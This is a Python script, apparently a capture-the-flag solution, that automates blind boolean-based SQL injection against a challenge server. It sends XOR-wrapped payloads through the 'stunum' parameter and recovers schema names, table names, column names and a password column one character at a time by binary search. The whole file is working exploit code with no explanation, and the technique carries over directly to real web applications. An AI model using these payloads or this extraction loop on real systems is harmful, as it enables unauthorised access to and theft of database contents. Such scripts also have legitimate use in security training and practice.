import re
import requests
import string

url = "http://ea6bd2d2-0935-4e72-86df-8121dfcbcbbf.node4.buuoj.cn:81/"
flag = ''

def payload(i, j):
    # 数据库名字
    sql = "1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1"%(i,j)
    # 表名
    # sql = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))>%d)^1"%(i,j)
    # 列名
    # sql = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1"%(i,j)
    # 查询flag
    # sql = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" % (i, j)
    data = {"stunum": sql}
    r = requests.get(url, params=data)
    # print (r.url)
    if "score" in r.text:
        res = 1
    else:
        res = 0
    return res


def exp():
    global flag
    for i in range(1,180):
        print(i, ':')
        low = 31
        high = 127
        while low <= high:
            mid = (low + high) // 2
            res = payload(i, mid)
            if res:
                low = mid + 1
            else:
                high = mid - 1
        f = int((low + high + 1)) // 2
        if (f == 127 or f == 31):
            break
        # print (f)
        flag += chr(f)
        print(flag)


exp()
print('flag=', flag)